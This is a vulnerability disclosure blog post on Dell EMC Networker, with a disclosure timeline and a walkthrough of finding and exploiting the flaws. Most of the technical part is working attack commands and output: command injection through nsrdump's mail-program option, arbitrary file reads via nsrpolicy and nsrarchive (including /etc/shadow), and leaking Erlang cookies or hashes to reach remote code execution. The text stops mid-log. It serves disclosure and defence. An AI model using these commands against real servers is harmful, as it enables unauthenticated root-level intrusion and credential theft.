---
layout: post
title:  "So Many Ways to Own Dell EMC Networker"
image: assets/backup_stacks_by_jaymis_cc_by_20_social.jpg
author: qkaiser
date:   2021-06-12 06:00:00
comments: true
categories: security
excerpt: |
     In the [previous article]({{site.url}}/security/2021/03/11/emc-networker-oldauth-is-not-auth/) we covered the different authentication mechanisms implemented by Dell EMC Networker, pointed out the flaws in each of them (identification in oldauth, trust-on-first-use for nsrauth), and provided clear recommendations to Dell EMC Networker administrators that are close to what is said in the [EMC NetWorker Security Configuration Guide](https:// www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf).

Today we release multiple vulnerabilities affecting Dell EMC Networker to the public. These issues can be exploited as an unauthenticated user in order to gain arbitrary file read or remote command execution. For this to work, we make the assumption that our IP address is in the allow-list and that either oldauth is enabled, or that nsrauth is enabled but the server did not receive an nsrauth request yet (TOFU). 
---

In the [previous article]({{site.url}}/security/2021/03/11/emc-networker-oldauth-is-not-auth/) we covered the different authentication mechanisms implemented by Dell EMC Networker, pointed out the flaws in each of them (identification in oldauth, trust-on-first-use for nsrauth), and provided clear recommendations to Dell EMC Networker administrators that are close to what is said in the [EMC NetWorker Security Configuration Guide](https:// www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf).

Today we release multiple vulnerabilities affecting Dell EMC Networker to the public. These issues can be exploited as an unauthenticated user in order to gain arbitrary file read or remote command execution. For this to work, we make the assumption that our IP address is in the allow-list and that either oldauth is enabled, or that nsrauth is enabled but the server did not receive an nsrauth request yet (TOFU). 

{:.foo}
 !["Backup Stacks" by Jaymis is licensed with CC BY 2.0.]({{site.url}}/assets/backup_stacks_by_jaymis_cc_by_20.jpg)


> EMC NetWorker (formerly Legato NetWorker) is an enterprise-level data protection software product that unifies and automates backup to tape, disk-based, and flash-based storage media across physical and virtual environments for granular and disaster recovery. Cross-platform support is provided for Linux, Windows, macOS, NetWare, OpenVMS and Unix environments.

These issues were reported to Dell in March 2021:

| Name                                   | Comment                                                                                          | ID            |
|----------------------------------------|--------------------------------------------------------------------------------------------------|---------------|
| Information leak in nsrpolicy          | Dell consider it to be fixed since [March 2019](https://seclists.org/fulldisclosure/2019/Mar/50), but we demonstrated it still works against version 19.4.0.0.Build.25 (latest in Q1 2021). | CVE-2017-8023 |
| Arbitrary command injection in nsrdump | Dell consider it to be fixed since [March 2019](https://seclists.org/fulldisclosure/2019/Mar/50), but we demonstrated it still works against version 19.4.0.0.Build.25 (latest in Q1 2021). | CVE-2017-8023 |
| Information leak in nsrarchive         | Dell did not released a fix within 90 days. 0day.                                                | PSRC-15195    |
| Arbitrary file read in nsr_render_log  | Dell did not released a fix within 90 days. 0day.                                                | PSRC-15190    |

**Coordinated Disclosure Timeline**

- March 12 2021 - Sent report to Dell
- March 15 2021 - Dell acknowledge reception of the report
- May 7 2021 - Update from Dell (working on a remediation plan)
- May 28 2021 - Update from Dell (still working on a remediation plan, ask about my disclosure plans)
- May 28 2021 - Answer Dell with the initialy provided 90 days disclosure policy description
- June 4 2021 - Update from Dell (two issues might be CVE-2017-8023, says the fix will be ready by November, ask again what my disclosure plans are)
- June 6 2021 - Answer Dell, explaining that we plan on publishing a blog post here after the 90 days if no fix is available
- June 8 2021 - Dell gets back to us, explaining that their product team could get a fix out by August 2021. Ask if we could wait until then.
- June 10 2021 - Answer Dell that we are strictly adhering to our 90 days disclosure policy.
- June 10 2021 - Dell request a copy of this post.
- June 11 2021 - Update from Dell (we're publishing the advisory, thanks for working with us)

Each vulnerability is fully described below, along with a small walkthrough of how they were identified and exploited. For the impatient, proof-of-concepts are available on Github at [https://github.com/qkaiser/networker-pocs](https://github.com/qkaiser/networker-pocs).

### Command Injection to RCE with nsrdump

#### Summary

The 'nsrdump' command exposed by Dell EMC Networker Server nsrexecd service is
affected by an arbitrary command injection vulnerability. By abusing this flaw and existing
weaknesses in the oldauth/nsrauth authentication mechanisms, an unauthenticated
attacker could execute arbitrary commands on the remote system with the privileges
of the nsrexecd service.

#### Impact

An unauthenticated attacker can gain remote command execution with administrative
privileges (root on Linux, SYSTEM on Windows) on hosts where Dell EMC Networker Server
is installed.

#### Affected Products

The following Dell EMC Networker products are affected:

- Dell EMC Networker Server version >= 9.1.0.2 for Linux
- Dell EMC Networker Server version >= 9.1.0.2 for Windows

Please note that we could not test against versions prior to 9.1.0.2 for lack of availability. The latest version we tested against is version **19.4.0.0.Build.25**, which is the latest stable version per Dell EMC.

#### Description

From the nsrexec manual page:

> The  nsrexec  command  is run only by other NetWorker commands. It is used to remotely execute commands on NetWorker clients running nsrexecd, and also to monitor the progress of those commands.

This description is misleading given that nsrexecd runs on every EMC Networker component (server, client, and storage node). We also would like to point out that by "commands", they mean "networker commands" and not "arbitrary commands". Networker commands are a limited subset of Networker binaries such as *savefs* or *savegrp*.


##### Investigating Command Injections

We initially checked if we could inject commands via the RPC command itself by injecting shell meta-characters. As we can see from the output below, the RPC command itself is properly escaped and cannot be abused for command injection.

```
[root@networker-server vagrant]# export RCMD="nsrdump;ls;"
[root@networker-server vagrant]# nsrexec -c 127.0.0.1
139545 1613657003 5 1 23 134215424 670 0 networker-server nsrexecd 32 Unable to spawn process '%s': %s 2 23 11 nsrdump;ls; 24 25 No such file or directory
nsrdump;ls;: Command not found
[root@networker-server vagrant]# export RCMD="nsrdump\$\(ls\)"
[root@networker-server vagrant]# nsrexec -c 127.0.0.1
Invalid command
[root@networker-server vagrant]# export RCMD="nsrdump||ls"
[root@networker-server vagrant]# nsrexec -c 127.0.0.1
139545 1613657142 5 1 23 134215424 670 0 networker-server nsrexecd 32 Unable to spawn process '%s': %s 2 23 11 nsrdump||ls 24 25 No such file or directory
nsrdump||ls: Command not found
[root@networker-server vagrant]# export RCMD="nsrdump&&ls"
[root@networker-server vagrant]# nsrexec -c 127.0.0.1
139545 1613657151 5 1 23 97580800 670 0 networker-server nsrexecd 32 Unable to spawn process '%s': %s 2 23 11 nsrdump&&ls 24 25 No such file or directory
nsrdump&&ls: Command not found
```

We also noted that nsrexecd implements an allow-list and a deny-list for RPC commands, meaning that a remote user can only request the execution of a limited set of binaries.

A system binary like 'ls' is not allowed:

```
[root@networker-server vagrant]# export RCMD="ls"
[root@networker-server vagrant]# nsrexec -c 127.0.0.1
Invalid command
```

Any command that starts with `nsr` is allowed and will be looked for within these directories:

```
[pid  4358] access("/usr/sbin/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/usr/lib/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/lib/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/bin/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/sbin/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/usr/bin/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/usr/sbin/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/usr/bin/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/usr/sbin/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/bin/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
[pid  4358] access("/sbin/nsr/nsrlol", X_OK) = -1 ENOENT (Aucun fichier ou dossier de ce type)
```

And a custom deny-list blocks execution of the following NSR binaries, which can be considered dangerous for Networker's operations:

- nsradmin
- nsrexecd
- nsraddadmin
- nsr_shutdown
- nsrfile
- recover
- dp_recover

We therefore started looking for vulnerabilities affecting the allowed binaries themselves.

##### Finding the right candidate: nsrdump

One command that caught our eye is **nsrdump**. There is no manual entry for nsrdump, but the help output is provided below:

```
nsrdump -h
usage: nsrdump [-V | [[-efnx?] [-D debug_level] [-M mail_program] [-a skip_attr]
	[-r skip_resource] [-m email_address] [-o output_file] [-s sender_address]]
```

nsrdump is a utility that dumps the Dell EMC Networker Server configuration to stdout. An interesting aspect of that utility is that the dumped information can be sent out to an email address (`-m email_address`). For the email to be sent out, two other parameters must be set explicitly: the output file (`-o output_file`) and the mail program (`-M mail_program`).

One could, for example, provide sendmail as a mail program:

```
export RCMD="nsrdump -m root@localhost -o test -M sendmail"
nsrexec -c 127.0.0.1
89477 1613727512 5 1 2 1438164800 16224 0 networker-server nsrdump SYSTEM critical 23 error
sending mail: %s. 1 0 108 sendmail -s "Report Home 1.0 networker-server1606991028192168121238"
root@localhost < "/nsr/applogs/rh/test"
```

And nsrdump would launch a subprocess with command line ("sh -c sendmail ..."):

```
[pid 16224] execve("/usr/sbin/nsrdump", ["/usr/sbin/nsrdump", "-m", "root@localhost", "-o",
"test", "-M", "sendmail"], 0x7faa70014470 /* 9 vars */) = 0
[pid 16231] execve("/bin/sh", ["sh", "-c", "sendmail -s \"Report Home 1.0 net"...], 
0x7ffec9638e18 /* 9 vars */) = 0
```

The nsrdump binary accepts any input for the mail program parameter, which leads to arbitrary command injection. In the examples below, we demonstrate two ways of calling `id`:


```
[root@networker-server /]# export RCMD="nsrdump -m root@localhost -o test -M 'id;'"
[root@networker-server /]# nsrexec -c 127.0.0.1
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh: -s: command not found
89477 1613727665 5 1 2 848533312 16405 0 networker-server nsrdump SYSTEM critical 23 error
sending mail: %s. 1 0 103 id; -s "Report Home 1.0 networker-server1606991028192168121238"
root@localhost < "/nsr/applogs/rh/test"
```

```
[root@networker-server /]# export RCMD="nsrdump -m root@localhost -o test -M '\$\(id\)'"
[root@networker-server /]# nsrexec -c 127.0.0.1
sh: uid=0(root): command not found
89477 1613727689 5 1 2 1844410176 16447 0 networker-server nsrdump SYSTEM critical 23 error
sending mail: %s. 1 0 105 $(id) -s "Report Home 1.0 networker-server1606991028192168121238"
root@localhost < "/nsr/applogs/rh/test"
```

This is confirmed by *stracing* the nsrexecd daemon. As we can see in the excerpt below, the `id` binary is launched with execve:

```
[pid  4018] execve("/usr/sbin/nsrdump", ["/usr/sbin/nsrdump", "-o", "test", "-M", "id;",
"-m", "root@localhost"], 0x7f91fc00ecf0 /* 10 vars */) = 0
[pid  4025] execve("/bin/sh", ["sh", "-c", "id; -s \"Report Home 1.0 networke"...], 
0x7ffd3cd861d8 /* 10 vars */) = 0
[pid  4026] execve("/usr/bin/id", ["id"], 0x81b4f0 /* 13 vars */) = 0
```

##### Validating on AWS

We confirmed that this vulnerability affects version (19.4.0.0.Build.25) by launching the attack against our Networker deployment on AWS.

```
[root@networker-client ~]# export RCMD="nsrdump -m root@localhost -o test -M 'id;'"
[root@networker-client ~]# nsrexec -c 52.86.24.194
uid=0(root) gid=0(root) groups=0(root)
sh: -s: command not found
89477 1613665920 5 1 2 3015612224 4388 0 ip-172-31-50-5.ec2.internal nsrdump SYSTEM critical 23
error sending mail: %s. 1 0 117 id; -s "Report Home 1.0 ip-172-31-50-5.ec2.internal161358023617231505"
root@localhost < "/nsr/applogs/rh/randomstuff"
```

##### Validating on Windows

Windows hosts are also affected, here we demonstrate it by executing `ping`. First we set the command via `RCMD`, this time using a `&` separator to inject our command:

```
export RCMD="nsrdump -m root@localhost -o testy -M 'ping -n 3 192.168.121.238 &'"
nsrexec -c networker-win
```

As we can see from the Process Monitor screenshot below, the `nsrexecd` daemon launched `nsrdump`, which in turn launched `cmd.exe` with our injected command:

{:.foo}
![windows]({{site.url}}/assets/nsrexecd_proc_dump.png)

Below is the nsrdump full command line:

```
"C:\Program Files\EMC NetWorker\nsr\bin\nsrdump.exe" -m root@localhost -o testy -M "ping -n 3 192.168.121.238 &"
```

And here is the cmd.exe full command line:

```
C:\Windows\system32\cmd.exe /c ping -n 3 192.168.121.238 & -s
"Report Home 1.0 networker-win1613730535fe8079263bc08dd78858"
root@localhost < "C:\Program Files\EMC NetWorker\nsr\applogs\rh\testy"
```

---

### Arbitrary File Read to RCE with nsrarchive, nsrpolicy, nsr_render_log

#### Summary

The 'nsrpolicy' command exposed by Dell EMC Networker Server nsrexecd service is
affected by an information leak vulnerability. By abusing this flaw and existing
weaknesses in the oldauth/nsrauth authentication mechanisms, an unauthenticated
attacker could read sensitive files from any host exposing the nsrexecd service.

On Dell EMC Networker Server, this information leak can be turned into remote command
execution by taking advantage of Erlang runtime's presence. Specifically, an attacker
can obtain the Erlang cookie value from a file stored on the remote system and use it
to establish an authenticated session to the remote Erlang daemon, therefore gaining
the ability to execute arbitrary commands on the remote system with elevated privileges.

#### Impact

An unauthenticated attacker can gain remote command execution with administrative
privileges (root on Linux, SYSTEM on Windows) on hosts where Dell EMC Networker Server
is installed.

An unauthenticated attacker can gain remote access to any file on hosts where either
Dell EMC Networker Server is installed. Some limitations apply to files that can be read,
mainly due to the content they hold (special characters triggering nsrpolicy to exit early
without leaking the full content).

#### Affected Products

The following Dell EMC Networker products are affected:

- Dell EMC Networker Server version >= 9.1.0.2 for Linux (remote arbitrary file read and RCE)
- Dell EMC Networker Server version >= 9.1.0.2 for Windows (remote arbitrary file read and RCE)

Please note that we could not test against versions prior to 9.1.0.2 for lack of availability. The latest version we tested against is version **19.4.0.0.Build.25**, which is the latest stable version per Dell EMC.


#### Description

From the nsrexec manual page:

> The  nsrexec  command  is run only by other NetWorker commands. It is used to remotely execute commands on NetWorker clients running nsrexecd, and also to monitor the progress of those commands.

This description is misleading given that nsrexecd runs on every EMC Networker component (server, client, and storage node). We also would like to point out that by "commands", they mean "networker commands" and not "arbitrary commands". Networker commands are a limited subset of Networker binaries such as *savefs* or *savegrp*

One command that caught our eye is **nsrpolicy**:

> The  nsrpolicy  program  executes  NetWorker  backup  configuration  and activities. nsrpolicy performs the backup configuration through its three parameters: policy, workflow and action.

This command can take filenames as input, respectively:

```
nsrpolicy input-file
                 { --file_name file_name | -f file_name } [ --stop_on_error bool | -S bool ]

```

Given that nsrpolicy does not validate the received path and that it runs with root privileges, we can force it to read any file and print out the content on error:

```
[root@networker-client ~]# export RCMD="nsrpolicy input-file -f /etc/passwd"
[root@networker-client ~]# nsrexec -c 192.168.121.238 2>&1 | grep 'Command from file:'
121415:nsrpolicy: Command from file: root:x:0:0:root:/root:/bin/bash
121415:nsrpolicy: Command from file: bin:x:1:1:bin:/bin:/sbin/nologin
121415:nsrpolicy: Command from file: daemon:x:2:2:daemon:/sbin:/sbin/nologin
121415:nsrpolicy: Command from file: adm:x:3:4:adm:/var/adm:/sbin/nologin
121415:nsrpolicy: Command from file: lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
121415:nsrpolicy: Command from file: sync:x:5:0:sync:/sbin:/bin/sync
121415:nsrpolicy: Command from file: shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
121415:nsrpolicy: Command from file: halt:x:7:0:halt:/sbin:/sbin/halt
121415:nsrpolicy: Command from file: mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
121415:nsrpolicy: Command from file: operator:x:11:0:operator:/root:/sbin/nologin
121415:nsrpolicy: Command from file: games:x:12:100:games:/usr/games:/sbin/nologin
121415:nsrpolicy: Command from file: ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
121415:nsrpolicy: Command from file: nobody:x:99:99:Nobody:/:/sbin/nologin
121415:nsrpolicy: Command from file: systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
121415:nsrpolicy: Command from file: dbus:x:81:81:System message bus:/:/sbin/nologin
121415:nsrpolicy: Command from file: polkitd:x:999:998:User for polkitd:/:/sbin/nologin
121415:nsrpolicy: Command from file: rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
121415:nsrpolicy: Command from file: tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
121415:nsrpolicy: Command from file: rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
121415:nsrpolicy: Command from file: nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
121415:nsrpolicy: Command from file: sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
121415:nsrpolicy: Command from file: postfix:x:89:89::/var/spool/postfix:/sbin/nologin
121415:nsrpolicy: Command from file: chrony:x:998:995::/var/lib/chrony:/sbin/nologin
121415:nsrpolicy: Command from file: vagrant:x:1000:1000:vagrant:/home/vagrant:/bin/bash
121415:nsrpolicy: Command from file: nsrtomcat:x:1001:1001::/nsr/authc:/sbin/nologin
121415:nsrpolicy: Command from file: tcpdump:x:72:72::/:/sbin/nologin
```

Windows hosts are also affected, here we demonstrate it by reading the remote system hosts file:

```
[root@networker-client vagrant]# export RCMD='nsrpolicy input-file -f "C:\\Windows\\System32\\drivers\\etc\\hosts"'
[root@networker-client vagrant]# nsrexec -c 192.168.121.183 2>&1 | grep 'Command from file'
121415:nsrpolicy: Command from file: 
121415:nsrpolicy: Command from file: 192.168.121.92	networker-client1
121415:nsrpolicy: Command from file: 192.168.121.50	networker-client
121415:nsrpolicy: Command from file: 192.168.121.238	networker-server
--snip--
```

Another command that caught our eye is **nsrarchive**:

> nsrarchive can archive files, directories, or entire filesystems to the NetWorker server (see nsr(8)).  The progress of an archive can be monitored using the Java based NetWorker Management  Console or  the curses(3X) based nsrwatch(8) program, depending on the terminal type.  Use of nsrarchive is restricted to users in NetWorker 'administrator' list or members of the 'archive users' list or to those who possess the 'Archive Data' privilege.

This command can take filenames as input, respectively:

```
-f filename The file from which to read  default directives (see nsr(5)).
-I input_file In addition to taking the paths for nsrarchive from the command line,\
a list of paths in the named input_file will be archived.\
The paths must be listed one per line.\
If no paths are specified on the command line, then only those paths specified in the input_file will be archived.
```

Given that nsrarchive does not validate the received path, that it runs with root privileges, and that it prints out the file content on error, we can force it to print the content of sensitive files. In the example below, we make it dump the content of `/etc/shadow`:

```
nsrarchive -s 127.0.0.1 -I '/etc/shadow' -T t
Finished reading the annotation string; beginning the archive process.
87651:nsrarchive: Cannot get status on path 'root:$1$REDACTED.::0:99999:7:::':
Aucun fichier ou dossier de ce type
--snip--
```

Windows hosts are also affected, here we demonstrate it by reading the remote system hosts file:

```
export RCMD='nsrarchive -I "C:\\Windows\\System32\\drivers\\etc\\hosts" -T t'
nsrexec -c 192.168.121.183 | cut -d':' -f2 | sed 's/ No such file or directory [0-9 ]* //g' 
89922 1613751289 1 5 0 3588 2452 0 networker-win nsrarchive NSR notice 74 \nFinished reading the annotation string; beginning the archive process.\n 0
 %s. Continuing ...  1 24 184 A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handled within DNS itself.
#    127.0.0.1       localhost
#    
192.168.121.92   networker-client1
192.168.121.50   networker-client
192.168.121.238  networker-server
```


##### Pivoting from Information Leak to RCE

Looking for ways to gain greater control over the target with this information leak, we identified that Dell EMC Networker Server runs a RabbitMQ message broker service. As we can see in the diagram below, that service (TCP/5672, TCP/5671) is used by the Networker Management Console.

{:.foo}
![EMC Dell Networker Network Diagram excerpt]({{site.url}}/assets/networker_server_network_diagram.png)


By default, RabbitMQ is configured for inter-node communication. This means it will expose two services on top of the existing AMQP service:

- epmd (for **Erlang Port Mapping Daemon**)
- eds (for **Erlang Distribution Server**)

These services will show up when you scan a Dell EMC Networker server:

```
Host is up, received arp-response (0.000019s latency).
Scanned at 2020-11-24 17:54:41 CET for 165s
PORT      STATE SERVICE         REASON         VERSION
4369/tcp  open  epmd            syn-ack ttl 64 Erlang Port Mapper Daemon
5672/tcp  open  amqp            syn-ack ttl 64 RabbitMQ 3.2.4 (0-9)
44296/tcp open  unknown         syn-ack ttl 64
MAC Address: 52:54:00:84:E6:65 (QEMU virtual NIC)
```

Note that port 44296 corresponds to Erlang Distribution Server, and is randomly chosen everytime Erlang runtime is restarted.

#### Erlang Port Mapper Daemon

Erlang Port Mapping Daemon is a small additional daemon that runs alongside every RabbitMQ node and is used by the runtime to discover what port a particular node listens on for inter-node communication.

Requesting the Erlang Distribution Server port from epmd can be done with the 'epmd-info' Nmap script:

```
nmap -sV -p4369 --script epmd-info -Pn -n -vvv 192.168.121.4
 
Nmap scan report for 192.168.121.4
Host is up, received arp-response (0.00017s latency).
Scanned at 2020-11-24 17:56:35 CET for 7s
 
PORT     STATE SERVICE REASON         VERSION
4369/tcp open  epmd    syn-ack ttl 64 Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 44296
MAC Address: 52:54:00:84:E6:65 (QEMU virtual NIC)
```

#### Erlang Cookie

The Erlang distribution server is used to coordinate distributed erlang instances. Should an attacker get the authentication cookie RCE is trivial. Usually, this cookie is named ".erlang.cookie" and varies on location.

On servers running Dell EMC Networker Server components, the file is **/nsr/rabbitmq/.erlang.cookie** on Linux and **C:\\\\Windows\\\\.erlang.cookie** on Windows. Given that we can leak that file content, we can gain remote command execution on the host by authenticating to the Erlang distribution service with that cookie.

Below is a quick demonstration of what dumping the Erlang cookie (`JFBODSOEGHDUTBYQTYYZ`) from a Windows host looks like:

```
[root@networker-client ~]# export RCMD='nsrarchive -f "C:\\Windows\\.erlang.cookie" -T t'
[root@networker-client ~]# nsrexec -c 192.168.121.183
89922 1613751664 1 5 0 1752 2468 0 networker-win nsrarchive NSR notice
74 \nFinished reading the annotation string; beginning the archive process.\n 0
87298 1613751664 2 5 0 1752 2468 0 networker-win nsrarchive NSR warning 48
Ignoring illegal external ASM name '%s' in '%s'. 2 0 20 JFBODSOEGHDUTBYQTYYZ
23 25 C:\Windows\.erlang.cookie
89987 1613751725 2 5 0 1752 2468 0 networker-win nsrarchive NSR warning
48 Cannot determine the job ID: %s. Continuing ...
1 24 184 A connection attempt failed because the connected party did not properly respond after a period of time,
or established connection failed because connected host has failed to respond.
98519 1613751731 2 5 0 1752 2468 0 networker-win nsrarchive NSR warning
47 Unable to setup direct save with server %s: %s. 2 12 13 networker-win
49 85 12289 54 archive services have not been enabled for client `%s' 1 12 13 networker-win
90095 1613751731 2 3 17 1752 2468 0 networker-win nsrarchive RAP warning
36 Cannot open %s session with '%s': %s 3 20 10 nsrarchive 12 13 networker-win
49 85 12289 54 archive services have not been enabled for client `%s' 1 12 13 networker-win
0 1613751731 1 5 0 1752 2468 0 networker-win nsrarchive NSR notice
48 %s%s: %-*s%s%s%s %*s %2.2ld:%2.2ld:%2.2ld %6s %s 14 0 0  20 10
nsrarchive 1 1 0 23 2 C: 0 1   0 0  0 0  1 1 0 0 5 24 GB 30 1 0 30 1 0 30 1 0 36 8 51410848 0 5 files
12289 1613751731 2 3 17 4088 4084 0 networker-win nsrd RAP warning
54 archive services have not been enabled for client `%s' 1 12 13 networker-win
94693 1613751731 5 5 0 1752 2468 0 networker-win nsrarchive NSR critical
35 The backup of save set '%s' failed. 1 51 2 C:
7167 1613751731 1 5 0 1752 2468 0 networker-win nsrarchive NSR notice
22 %s completion time: %s 2 20 10 nsrarchive 35 20 2/19/2021 5:22:11 PM
```

```
[root@networker-client ~]# export RCMD='nsrarchive -I "C:\\Windows\\.erlang.cookie" -T t'
[root@networker-client ~]# nsrexec -c 192.168.121.183
89922 1613751745 1 5 0 2084 2620 0 networker-win nsrarchive NSR notice
74 \nFinished reading the annotation string; beginning the archive process.\n 0
89987 1613751805 2 5 0 2084 2620 0 networker-win nsrarchive NSR warning
48 Cannot determine the job ID: %s. Continuing ...  1 24 184 A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
6999 1613751805 5 1 0 2084 2620 0 networker-win nsrarchive SYSTEM critical
29 %s: No such file or directory 1 0 20 JFBODSOEGHDUTBYQTYYZ
```

Below is a quick demonstration of what dumping the Erlang cookie (`XXEKXJXWOSTUZKOFMHJG`) from a Linux host looks like:

```
[root@networker-client usr]# export RCMD="nsrarchive -f '/nsr/rabbitmq/.erlang.cookie' -T t ."
[root@networker-client usr]# nsrexec -c 192.168.121.238
89922 1613660453 1 5 0 2354841408 8608 0 networker-server nsrarchive NSR notice
74 \nFinished reading the annotation string; beginning the archive process.\n 0
87298 1613660453 2 5 0 2354841408 8608 0 networker-server nsrarchive NSR warning
48 Ignoring illegal external ASM name '%s' in '%s'. 2 0 20 XXEKXJXWOSTUZKOFMHJG 23 28 /nsr/rabbitmq/.erlang.cookie
```

```
[root@networker-client vagrant]# export RCMD="nsrarchive -I '/nsr/rabbitmq/.erlang.cookie' -T t ."
[root@networker-client vagrant]# nsrexec -c 192.168.121.238
89922 1613752006 1 5 0 1774774080 10825 0 networker-server nsrarchive NSR notice
74 \nFinished reading the annotation string; beginning the archive process.\n 0
89987 1613752066 2 5 0 1774774080 10825 0 networker-server nsrarchive NSR warning
48 Cannot determine the job ID: %s. Continuing ...  1 24 20 Connection timed out
87651 1613752066 5 1 2 1774774080 10825 0 networker-server nsrarchive SYSTEM critical
34 Cannot get status on path '%s': %s 2 23 20 XXEKXJXWOSTUZKOFMHJG 24 25 No such file or directory
98519 1613752066 2 5 0 1774774080 10825 0 networker-server nsrarchive NSR warning
47 Unable to setup direct save with server %s: %s. 2 12 16 networker-server 49 88 12289
54 archive services have not been enabled for client `%s' 1 12 16 networker-server
90018 1613752066 2 3 17 1774774080 10825 0 networker-server nsrarchive RAP warning
55 Cannot open a %s session with NetWorker server '%s': %s 3 20 10 nsrarchive 12 16 networker-server
49 88 12289 54 archive services have not been enabled for client `%s' 1 12 16 networker-server
```

With nsrpolicy, the Erlang cookie cannot be read directly due to file format limitations:
```
[root@networker-server ~]# export RCMD="nsrpolicy input-file -f /nsr/rabbitmq/.erlang.cookie"
[root@networker-server ~]# nsrexec -c 192.168.121.238
The syntax of this command is:
nsrpolicy input-file
 --file_name               -f <file name>
[--stop_on_error           -S <0/1; default:0 (Do not stop)>]
[--debug                   -D <debug level>]
[--help                    -h]
```

```
[root@networker-client ~]# export RCMD="nsrpolicy input-file -f C:\Windows\.erlang.cookie"
[root@networker-client ~]# nsrexec -c 192.168.121.183
The syntax of this command is:
nsrpolicy input-file
 --file_name               -f <file name>
[--stop_on_error           -S <0/1; default:0 (Do not stop)>]
[--debug                   -D <debug level>]
[--help                    -h]
```

However, we can leak the hash from RabbitMQ logs and crack it using [dedicated tools](https://github.com/gteissier/erl-matter):

```
[root@networker-server ~]# export RCMD="nsrpolicy input-file -f /opt/nsr/rabbitmq-server-3.2.4/var/log/rabbitmq/rabbit@networker-server.log"
[root@networker-server ~]# nsrexec -c 192.168.121.238 2>&1 | grep Command
121415:nsrpolicy: Command from file:
121415:nsrpolicy: Command from file: =INFO REPORT==== 22-Feb-2021::13:32:46 ===
121415:nsrpolicy: Command from file: Starting RabbitMQ 3.2.4 on Erlang R16B03-1
121415:nsrpolicy: Command from file: Copyright (C) 2007-2013 GoPivotal, Inc.
121415:nsrpolicy: Command from file: Licensed under the MPL.  See http://www.rabbitmq.com/
121415:nsrpolicy: Command from file:
121415:nsrpolicy: Command from file: =INFO REPORT==== 22-Feb-2021::13:32:46 ===
121415:nsrpolicy: Command from file: node           : rabbit@networker-server
121415:nsrpolicy: Command from file: home dir       : /nsr/rabbitmq
121415:nsrpolicy: Command from file: config file(s) : (none)
121415:nsrpolicy: Command from file: cookie hash    : gOc/cQw7eTfGpOhV+okBXQ==
121415:nsrpolicy: Command from file: log            : /opt/nsr/rabbitmq-server-3.2.4/sbin/../var/log/rabbitmq/rabbit@networker-server.log
121415:nsrpolicy: Command from file: sasl log       : /opt/nsr/rabbitmq-server-3.2.4/sbin/../var/log/rabbitmq/rabbit@networker-server-sasl.log
121415:nsrpolicy: Command from file: database dir   : /opt/nsr/rabbitmq-server-3.2.4/sbin/../var/lib/rabbitmq/mnesia/rabbit@networker-server
121415:nsrpolicy: Command from file:
--snip--
```

```
[root@networker-client ~]# export RCMD="nsrpolicy input-file -f C:\Windows\System32\config\systemprofile\AppData\Roaming\RabbitMQ\log\rabbit@NETWORKER-WIN.log"
[root@networker-client ~]# nsrexec -c 192.168.121.183 2>&1 | grep Command
121415:nsrpolicy: Command from file:
121415:nsrpolicy: Command from file: =INFO REPORT==== 19-Feb-2021::11:29:07 ===
121415:nsrpolicy: Command from file: Starting RabbitMQ 3.2.4 on Erlang R16B03-1
121415:nsrpolicy: Command from file: Copyright (C) 2007-2013 GoPivotal, Inc.
121415:nsrpolicy: Command from file: Licensed under the MPL.  See http://www.rabbitmq.com/
121415:nsrpolicy: Command from file:
121415:nsrpolicy: Command from file: =INFO REPORT==== 19-Feb-2021::11:29:07 ===
121415:nsrpolicy: Command from file: node           : rabbit@NETWORKER-WIN
121415:nsrpolicy: Command from file: home dir       : C:\Windows
121415:nsrpolicy: Command from file: config file(s) : (none)
121415:nsrpolicy: Command from file: cookie hash    : 2HOFPWBXNZ3XmdRzs2x+cQ==
121415:nsrpolicy: Command from file: log            : C:/Windows/system32/config/systemprofile/AppData/Roaming/RabbitMQ/log/rabbit@NETWORKER-WIN.log
121415:nsrpolicy: Command from file: sasl log       : C:/Windows/system32/config/systemprofile/AppData/Roaming/RabbitMQ/log/rabbit@NETWORKER-WIN-sasl.log
